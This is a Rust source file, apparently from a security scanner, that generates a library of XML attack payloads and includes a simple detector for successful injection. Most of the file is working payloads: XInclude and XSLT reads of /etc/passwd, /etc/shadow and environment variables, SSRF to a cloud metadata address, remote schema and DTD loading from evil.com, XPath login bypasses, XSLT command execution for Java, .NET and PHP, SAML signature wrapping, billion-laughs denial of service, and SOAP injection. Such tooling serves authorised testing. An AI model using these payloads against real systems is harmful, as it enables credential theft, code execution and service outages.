/// Comprehensive XML injection payload generation beyond basic XXE.
///
/// Covers eight attack families: XInclude injection, XML Schema poisoning,
/// XPath injection, XSLT injection, XML signature wrapping, DTD denial-of-service
/// (billion laughs), XML namespace confusion, and SOAP injection.
use aegis_protocol::finding::VulnerabilityClass;
use aegis_protocol::operation::OperationLogEntry;

use crate::recon_client;

/// Categorizes the eight distinct XML injection attack families.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum XmlInjectionType {
    XInclude,
    XmlSchemaPoisoning,
    XPathInjection,
    XsltInjection,
    XmlSignatureWrapping,
    DtdDenialOfService,
    NamespaceConfusion,
    SoapInjection,
}

impl std::fmt::Display for XmlInjectionType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::XInclude => write!(f, "xinclude_injection"),
            Self::XmlSchemaPoisoning => write!(f, "xml_schema_poisoning"),
            Self::XPathInjection => write!(f, "xpath_injection"),
            Self::XsltInjection => write!(f, "xslt_injection"),
            Self::XmlSignatureWrapping => write!(f, "xml_signature_wrapping"),
            Self::DtdDenialOfService => write!(f, "dtd_denial_of_service"),
            Self::NamespaceConfusion => write!(f, "namespace_confusion"),
            Self::SoapInjection => write!(f, "soap_injection"),
        }
    }
}

/// Individual payload with metadata for classification.
#[derive(Debug, Clone, PartialEq)]
pub struct XmlInjectionPayload {
    pub injection_type: XmlInjectionType,
    pub payload: String,
    pub description: String,
    pub severity: f64,
}

/// XSLT processor runtime targeted by a payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum XsltProcessor {
    Java,
    DotNet,
    Php,
}

impl std::fmt::Display for XsltProcessor {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Java => write!(f, "java_xalan"),
            Self::DotNet => write!(f, "dotnet"),
            Self::Php => write!(f, "php"),
        }
    }
}

/// Configuration for billion laughs depth control.
#[derive(Debug, Clone)]
pub struct BillionLaughsConfig {
    pub expansion_depth: u8,
    pub entity_name: String,
}

impl Default for BillionLaughsConfig {
    fn default() -> Self {
        Self {
            expansion_depth: 5,
            entity_name: "lol".to_string(),
        }
    }
}

impl BillionLaughsConfig {
    pub fn with_depth(mut self, depth: u8) -> Self {
        self.expansion_depth = depth.min(10);
        self
    }

    pub fn with_entity_name(mut self, name: String) -> Self {
        self.entity_name = name;
        self
    }
}

/// Generates all payload families. Returns payloads across all 8 injection types.
pub fn generate_all_payloads(laughs_config: &BillionLaughsConfig) -> Vec<XmlInjectionPayload> {
    let mut payloads = Vec::new();
    payloads.extend(generate_xinclude_payloads());
    payloads.extend(generate_schema_poisoning_payloads());
    payloads.extend(generate_xpath_payloads());
    payloads.extend(generate_xslt_payloads());
    payloads.extend(generate_signature_wrapping_payloads());
    payloads.extend(generate_billion_laughs_payloads(laughs_config));
    payloads.extend(generate_namespace_confusion_payloads());
    payloads.extend(generate_soap_injection_payloads());
    payloads
}

/// XInclude injection payloads for applications that process partial XML.
pub fn generate_xinclude_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XInclude,
            payload: r#"<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>"#.to_string(),
            description: "XInclude local file read via /etc/passwd".to_string(),
            severity: 9.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XInclude,
            payload: r#"<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/shadow" parse="text"/>"#.to_string(),
            description: "XInclude shadow file exfiltration".to_string(),
            severity: 9.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XInclude,
            payload: r#"<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="http://169.254.169.254/latest/meta-data/" parse="text"/>"#.to_string(),
            description: "XInclude SSRF to cloud metadata endpoint".to_string(),
            severity: 9.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XInclude,
            payload: r#"<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///proc/self/environ" parse="text"/>"#.to_string(),
            description: "XInclude process environment variable leak".to_string(),
            severity: 8.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XInclude,
            payload: r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/hostname" parse="text"/></foo>"#.to_string(),
            description: "XInclude wrapped in parent element for partial XML injection".to_string(),
            severity: 8.0,
        },
    ]
}

/// XML Schema (XSD) poisoning payloads that redirect schema resolution.
pub fn generate_schema_poisoning_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XmlSchemaPoisoning,
            payload: r#"<?xml version="1.0"?><root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://evil.com/schema.xsd">data</root>"#.to_string(),
            description: "Schema location redirect to attacker-controlled XSD".to_string(),
            severity: 7.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XmlSchemaPoisoning,
            payload: r#"<?xml version="1.0"?><root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://target.com http://evil.com/override.xsd">data</root>"#.to_string(),
            description: "Override schemaLocation with attacker namespace mapping".to_string(),
            severity: 7.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XmlSchemaPoisoning,
            payload: r#"<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://evil.com/poison.dtd">%remote;]><root/>"#.to_string(),
            description: "DTD-based schema poisoning via remote parameter entity".to_string(),
            severity: 8.0,
        },
    ]
}

/// XPath injection payloads for auth bypass and data extraction from XML stores.
pub fn generate_xpath_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XPathInjection,
            payload: "' or '1'='1".to_string(),
            description: "XPath auth bypass: always-true condition".to_string(),
            severity: 9.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XPathInjection,
            payload: "' or 1=1 or '".to_string(),
            description: "XPath auth bypass: double-or tautology".to_string(),
            severity: 9.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XPathInjection,
            payload: "admin' or '1'='1' or 'a'='a".to_string(),
            description: "XPath auth bypass targeting admin user node".to_string(),
            severity: 9.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XPathInjection,
            payload: "'] | //user/*[contains(name(),'".to_string(),
            description: "XPath data extraction: union query to dump user nodes".to_string(),
            severity: 8.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XPathInjection,
            payload: "') or count(//user)>0 or ('".to_string(),
            description: "XPath blind extraction: boolean enumeration of user count".to_string(),
            severity: 8.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XPathInjection,
            payload: "' or string-length(//user[1]/password)>0 or '".to_string(),
            description: "XPath blind extraction: password field length probe".to_string(),
            severity: 8.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XPathInjection,
            payload: "'] | //*[starts-with(name(),'pass')]/text() | //*['".to_string(),
            description: "XPath data extraction: wildcard password node dump".to_string(),
            severity: 9.0,
        },
    ]
}

/// XSLT injection payloads targeting specific processor runtimes.
pub fn generate_xslt_payloads() -> Vec<XmlInjectionPayload> {
    let mut payloads = Vec::new();
    payloads.extend(generate_xslt_java_payloads());
    payloads.extend(generate_xslt_dotnet_payloads());
    payloads.extend(generate_xslt_php_payloads());
    payloads
}

/// XSLT payloads for Java (Xalan/Saxon) processors.
pub fn generate_xslt_java_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XsltInjection,
            payload: r#"<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" version="1.0"><xsl:template match="/"><xsl:variable name="rtObj" select="rt:getRuntime()"/><xsl:variable name="process" select="rt:exec($rtObj,'id')"/></xsl:template></xsl:stylesheet>"#.to_string(),
            description: "XSLT RCE via Xalan Java runtime extension".to_string(),
            severity: 9.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XsltInjection,
            payload: r#"<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:value-of select="document('file:///etc/passwd')"/></xsl:template></xsl:stylesheet>"#.to_string(),
            description: "XSLT file read via document() function on Java".to_string(),
            severity: 8.5,
        },
    ]
}

/// XSLT payloads for .NET XSLT processors.
pub fn generate_xslt_dotnet_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XsltInjection,
            payload: r#"<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:cs="urn:cs" version="1.0"><msxsl:script language="C#" implements-prefix="cs">public string exec(){return System.Diagnostics.Process.Start("cmd","/c whoami").StandardOutput.ReadToEnd();}</msxsl:script><xsl:template match="/"><xsl:value-of select="cs:exec()"/></xsl:template></xsl:stylesheet>"#.to_string(),
            description: "XSLT RCE via .NET msxsl:script C# code execution".to_string(),
            severity: 9.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XsltInjection,
            payload: r#"<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:value-of select="unparsed-text('file:///c:/windows/win.ini')"/></xsl:template></xsl:stylesheet>"#.to_string(),
            description: "XSLT file read via unparsed-text on .NET".to_string(),
            severity: 8.5,
        },
    ]
}

/// XSLT payloads for PHP XSLTProcessor.
pub fn generate_xslt_php_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XsltInjection,
            payload: r#"<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0"><xsl:template match="/"><xsl:value-of select="php:function('system','id')"/></xsl:template></xsl:stylesheet>"#.to_string(),
            description: "XSLT RCE via PHP registerPHPFunctions extension".to_string(),
            severity: 9.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XsltInjection,
            payload: r#"<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0"><xsl:template match="/"><xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/></xsl:template></xsl:stylesheet>"#.to_string(),
            description: "XSLT file read via PHP file_get_contents".to_string(),
            severity: 8.5,
        },
    ]
}

/// Returns XSLT payloads filtered by target processor.
pub fn xslt_payloads_for_processor(processor: XsltProcessor) -> Vec<XmlInjectionPayload> {
    match processor {
        XsltProcessor::Java => generate_xslt_java_payloads(),
        XsltProcessor::DotNet => generate_xslt_dotnet_payloads(),
        XsltProcessor::Php => generate_xslt_php_payloads(),
    }
}

/// XML digital signature wrapping attack payloads.
pub fn generate_signature_wrapping_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XmlSignatureWrapping,
            payload: r##"<Wrapper><Object Id="orig"><SignedData>legit</SignedData></Object><Object Id="evil"><SignedData>malicious</SignedData></Object><Signature><Reference URI="#orig"/></Signature></Wrapper>"##.to_string(),
            description: "Signature wrapping: duplicate element with preserved reference".to_string(),
            severity: 8.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XmlSignatureWrapping,
            payload: r##"<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope"><env:Header><wsse:Security><Signature><Reference URI="#body"/></Signature></wsse:Security></env:Header><env:Body Id="body"><Legit/></env:Body><env:Body Id="injected"><Malicious/></env:Body></env:Envelope>"##.to_string(),
            description: "SOAP signature wrapping: injected Body after signed Body".to_string(),
            severity: 8.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::XmlSignatureWrapping,
            payload: r##"<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject><Signature><Reference URI="#original"/></Signature><OriginalAssertion Id="original"><saml:Subject><saml:NameID>user</saml:NameID></saml:Subject></OriginalAssertion></saml:Assertion>"##.to_string(),
            description: "SAML signature wrapping: admin assertion wraps signed user assertion".to_string(),
            severity: 9.0,
        },
    ]
}

/// DTD denial-of-service payloads (billion laughs variants) with configurable depth.
pub fn generate_billion_laughs_payloads(config: &BillionLaughsConfig) -> Vec<XmlInjectionPayload> {
    vec![
        build_billion_laughs(config),
        XmlInjectionPayload {
            injection_type: XmlInjectionType::DtdDenialOfService,
            payload: r#"<!DOCTYPE foo [<!ENTITY % a "AAAAAAAAAA"><!ENTITY % b "%a;%a;%a;%a;%a;"><!ENTITY % c "%b;%b;%b;%b;%b;">]><foo>&c;</foo>"#.to_string(),
            description: "Parameter entity expansion bomb via nested references".to_string(),
            severity: 7.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::DtdDenialOfService,
            payload: r#"<!DOCTYPE foo [<!ENTITY dos SYSTEM "file:///dev/urandom">]><foo>&dos;</foo>"#
                .to_string(),
            description: "DTD DoS via /dev/urandom infinite read".to_string(),
            severity: 7.5,
        },
    ]
}

/// Builds a billion laughs payload with the configured depth.
fn build_billion_laughs(config: &BillionLaughsConfig) -> XmlInjectionPayload {
    let name = &config.entity_name;
    let depth = config.expansion_depth as usize;

    let mut dtd = format!(
        r#"<!DOCTYPE {name} [<!ENTITY {name} "{name}{name}{name}{name}{name}{name}{name}{name}{name}{name}">"#
    );
    for level in 1..=depth {
        dtd.push_str(&format!(
            r#"<!ENTITY {name}{level} "&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};">"#,
            prev = if level == 1 {
                name.to_string()
            } else {
                format!("{name}{}", level - 1)
            },
        ));
    }
    dtd.push(']');

    let top_entity = if depth == 0 {
        format!("&{name};")
    } else {
        format!("&{name}{depth};")
    };
    let payload = format!("{dtd}<{name}>{top_entity}</{name}>");

    let expansion_estimate = 10u64.saturating_pow(depth as u32 + 1);
    XmlInjectionPayload {
        injection_type: XmlInjectionType::DtdDenialOfService,
        payload,
        description: format!(
            "Billion laughs: {depth} levels, ~{expansion_estimate} entity expansions"
        ),
        severity: severity_for_depth(depth),
    }
}

pub fn severity_for_depth(depth: usize) -> f64 {
    match depth {
        0..=2 => 5.0,
        3..=5 => 7.0,
        6..=8 => 8.0,
        _ => 9.0,
    }
}

/// XML namespace confusion payloads exploiting parser namespace handling.
pub fn generate_namespace_confusion_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::NamespaceConfusion,
            payload: r#"<root xmlns:a="http://ns1.example.com" xmlns:b="http://ns1.example.com"><a:secret>visible</a:secret><b:secret>hidden</b:secret></root>"#.to_string(),
            description: "Namespace alias collision: two prefixes map to same URI".to_string(),
            severity: 6.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::NamespaceConfusion,
            payload: r#"<root xmlns="http://legit.example.com"><child xmlns="http://evil.example.com"><action>delete-all</action></child></root>"#.to_string(),
            description: "Default namespace override in nested element".to_string(),
            severity: 6.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::NamespaceConfusion,
            payload: r#"<root xmlns:sec="http://security.example.com"><sec:allow-all xmlns:sec="http://evil.example.com/sec">true</sec:allow-all></root>"#.to_string(),
            description: "Namespace prefix rebinding to bypass security checks".to_string(),
            severity: 7.0,
        },
    ]
}

/// SOAP injection payloads for manipulating SOAP envelope structure.
pub fn generate_soap_injection_payloads() -> Vec<XmlInjectionPayload> {
    vec![
        XmlInjectionPayload {
            injection_type: XmlInjectionType::SoapInjection,
            payload: r#"</UserInput><soap:Header><wsse:Security><UsernameToken><Username>admin</Username><Password>admin</Password></UsernameToken></wsse:Security></soap:Header><soap:Body><OriginalCall><UserInput>"#.to_string(),
            description: "SOAP header injection: insert auth header via unclosed tag".to_string(),
            severity: 9.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::SoapInjection,
            payload: r#"</param1></Operation1></soap:Body></soap:Envelope><!--"#.to_string(),
            description: "SOAP body truncation: close envelope early, comment out rest".to_string(),
            severity: 7.5,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::SoapInjection,
            payload: r#"</param1><admin>true</admin><param1>"#.to_string(),
            description: "SOAP parameter injection: sneak admin flag between params".to_string(),
            severity: 8.0,
        },
        XmlInjectionPayload {
            injection_type: XmlInjectionType::SoapInjection,
            payload: r#"<![CDATA[</param1></Operation><DeleteAll xmlns="http://target.com/api"/><Operation><param1>]]>"#.to_string(),
            description: "SOAP CDATA escape: inject additional operation element".to_string(),
            severity: 8.5,
        },
    ]
}

/// Returns all distinct injection types present in the suite.
pub fn injection_type_coverage() -> Vec<XmlInjectionType> {
    vec![
        XmlInjectionType::XInclude,
        XmlInjectionType::XmlSchemaPoisoning,
        XmlInjectionType::XPathInjection,
        XmlInjectionType::XsltInjection,
        XmlInjectionType::XmlSignatureWrapping,
        XmlInjectionType::DtdDenialOfService,
        XmlInjectionType::NamespaceConfusion,
        XmlInjectionType::SoapInjection,
    ]
}

/// CVSS-aligned severity for each injection type family.
pub fn injection_type_severity(injection_type: XmlInjectionType) -> f64 {
    match injection_type {
        XmlInjectionType::XsltInjection => 9.5,
        XmlInjectionType::XInclude => 9.0,
        XmlInjectionType::XPathInjection => 9.0,
        XmlInjectionType::SoapInjection => 8.5,
        XmlInjectionType::XmlSignatureWrapping => 8.0,
        XmlInjectionType::XmlSchemaPoisoning => 7.5,
        XmlInjectionType::DtdDenialOfService => 7.0,
        XmlInjectionType::NamespaceConfusion => 6.5,
    }
}

/// Converts a set of detected injection payloads to knowledge graph operations.
pub fn xml_injection_to_operations(
    payloads: &[XmlInjectionPayload],
    seq: &mut u64,
) -> Vec<OperationLogEntry> {
    payloads
        .iter()
        .map(|p| {
            recon_client::finding_entry(
                seq,
                VulnerabilityClass::XmlExternalEntity,
                p.severity,
                0.65,
            )
        })
        .collect()
}

/// Analyzes response body for indicators that XML injection succeeded.
pub fn detect_xml_injection_indicators(body: &str) -> Vec<XmlInjectionType> {
    let lower = body.to_ascii_lowercase();
    let mut detected = Vec::new();

    if (lower.contains("xi:include") || lower.contains("xinclude"))
        && (lower.contains("root:") || lower.contains("/bin/") || lower.contains("file:///"))
    {
        detected.push(XmlInjectionType::XInclude);
    }

    if lower.contains("schemalocation") && lower.contains("http") {
        detected.push(XmlInjectionType::XmlSchemaPoisoning);
    }

    if (lower.contains("xpath") || lower.contains("//user"))
        && (lower.contains("password") || lower.contains("admin"))
    {
        detected.push(XmlInjectionType::XPathInjection);
    }

    if (lower.contains("xsl:") || lower.contains("xslt"))
        && (lower.contains("system(")
            || lower.contains("exec(")
            || lower.contains("runtime")
            || lower.contains("php:function"))
    {
        detected.push(XmlInjectionType::XsltInjection);
    }

    if lower.contains("<signature")
        && lower.contains("reference uri=")
        && (body.matches("Id=").count() > 1 || body.matches("id=").count() > 1)
    {
        detected.push(XmlInjectionType::XmlSignatureWrapping);
    }

    if lower.contains("<!entity") && lower.matches("&").count() > 5 {
        detected.push(XmlInjectionType::DtdDenialOfService);
    }

    if lower.matches("xmlns").count() >= 2
        && (lower.contains("xmlns:") || lower.contains("xmlns="))
        && (lower.contains("evil") || namespace_rebinding_detected(&lower))
    {
        detected.push(XmlInjectionType::NamespaceConfusion);
    }

    if lower.contains("soap:")
        && (lower.contains("</") || lower.contains("<!--"))
        && (lower.contains("admin") || lower.contains("delete") || lower.contains("wsse:"))
    {
        detected.push(XmlInjectionType::SoapInjection);
    }

    detected
}

fn namespace_rebinding_detected(lower: &str) -> bool {
    let mut seen_prefixes = std::collections::HashMap::new();
    for cap in lower.match_indices("xmlns:") {
        let rest = &lower[cap.0 + 6..];
        let prefix_end = rest
            .find(|c: char| c == '=' || c.is_whitespace())
            .unwrap_or(rest.len());
        if prefix_end > 0 {
            let prefix = &rest[..prefix_end];
            let count = seen_prefixes.entry(prefix.to_string()).or_insert(0u32);
            *count += 1;
            if *count > 1 {
                return true;
            }
        }
    }
    false
}

#[cfg(test)]
#[path = "xml_injection_suite_test.rs"]
mod xml_injection_suite_test;
